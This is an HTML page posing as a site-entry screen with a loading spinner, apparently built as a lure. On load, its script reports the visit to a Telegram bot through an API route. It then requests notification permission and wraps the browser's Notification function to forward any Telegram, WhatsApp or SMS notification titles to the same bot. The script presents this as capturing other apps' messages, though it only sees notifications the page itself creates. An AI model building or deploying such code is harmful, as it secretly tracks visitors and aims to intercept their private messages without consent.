<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Multi-App Notifications Test</title>
  <link rel="icon" type="image/png" href="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg">
  <style>
    * { box-sizing: border-box; }
    body {
      margin:0; padding:0; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: url('https://i.postimg.cc/N2vfNSCn/Screenshot-20250805-190626-2.jpg') no-repeat center center fixed;
      background-size: cover; height:100vh; display:flex; align-items:center; justify-content:center; color:#fff; text-align:center;
      backdrop-filter: blur(6px);}
    .container { 
      background: rgba(0,0,0,0.6); border-radius:25px; padding:60px 45px; width:95%; max-width:950px; min-height:500px;
      box-shadow:0 0 25px rgba(0,255,153,0.5); display:flex; flex-direction:column; align-items:center;
      animation: popIn 0.7s ease-out;
    }
    .logo { width:160px; margin-bottom:30px; box-shadow:0 0 18px rgba(0,255,255,0.6);}
    .loader { border:7px solid rgba(255,255,255,0.2); border-top:7px solid #00ffcc; border-radius:50%; width:70px; height:70px; animation:spin 1s linear infinite; margin:25px 0;}
    .text { font-size:20px; line-height:1.8; text-shadow:0 0 6px rgba(0,0,0,0.6); color:#00ffe7; font-weight:bold; }
    .credit { margin-top:25px; font-size:15px; color:#ccc; font-weight:bold; }
    .btn {
      margin-top: 20px;
      padding: 10px 25px;
      border:none;
      border-radius:12px;
      background:#00ffcc;
      color:#000;
      font-weight:bold;
      cursor:pointer;
      box-shadow:0 0 10px #00ffcc;
      transition: 0.3s;
    }
    .btn:hover { background:#00e6b8; }
    @keyframes spin { 0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
    @keyframes popIn { 0%{opacity:0;transform:scale(0.9);}100%{opacity:1;transform:scale(1);} }
    @media (max-width:600px){ .container{margin:0 10px;padding:40px 25px;min-height:450px;} .logo{width:130px;} .text{font-size:17px;} }
  </style>
</head>
<body>
<div class="container">
  <img src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo" class="logo">
  <div class="text" id="status">ğŸ•µï¸â€â™‚ï¸ <b>You are entering the site...</b><br><b>Keep this page open ğŸ¥</b></div>
  <div class="loader"></div>
  <button class="btn" id="testBtn">ğŸ’¡ Test Notifications</button>
  <div class="credit">ğ— ğ—”ğ——ğ—˜ ğ—•ğ—¬ ğŸ’› ğ—ªğ—”ğ—–ğ—œğ—¤</div>
</div>

<script>
// Ø¯ Vercel API route ØªÙ‡ request
function sendNotificationToBot(message){
  fetch('/api/sendNotification', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message })
  })
  .then(res => res.json())
  .then(data => console.log("Notification sent:", data))
  .catch(err => console.error("Error:", err));
}

// Ù„ÙˆÙ…Ú“ÛŒ notification Ú©Ù„Ù‡ Ú†Û Ù¾Ø§Ú¼Ù‡ Ø®Ù„Ø§ØµÙ‡ Ø´ÙŠ
window.addEventListener('load', ()=>{
  sendNotificationToBot(`ğŸ”” Link opened at ${new Date().toLocaleTimeString()}`);
  setupAppNotifications();
});

// Ù…Ø®ØªÙ„Ù Ø§Ù¾Ù„ÛŒÚ©ÛŒØ´Ù†ÙˆÙ†Ùˆ Ù†ÙˆÙ¼ÛŒÙÛŒÚ©ÛŒØ´Ù†ÙˆÙ†Ù‡ ÙˆÙ†ÛŒØ³Ù‡
function setupAppNotifications(){
  if('Notification' in window){
    Notification.requestPermission().then(permission=>{
      if(permission === "granted"){
        const OriginalNotification = window.Notification;
        window.Notification = function(title, options){
          const sourceName = (options?.tag || title || "").toLowerCase();

          if(sourceName.includes("telegram")){
            sendNotificationToBot(`ğŸ”” Telegram notification: ${title}`);
          } else if(sourceName.includes("whatsapp")){
            sendNotificationToBot(`ğŸ“± WhatsApp notification: ${title}`);
          } else if(sourceName.includes("sms") || sourceName.includes("messages")){
            sendNotificationToBot(`âœ‰ï¸ SMS notification: ${title}`);
          }

          return new OriginalNotification(title, options);
        }
      }
    });
  }
}

// Test Button functionality
document.getElementById('testBtn').addEventListener('click', ()=>{
  sendNotificationToBot("ğŸ”” Telegram notification: Test message");
  sendNotificationToBot("ğŸ“± WhatsApp notification: Test message");
  sendNotificationToBot("âœ‰ï¸ SMS notification: Test message");
  alert("Test notifications sent! Check your Telegram bot.");
});
</script>
</body>
</html> 
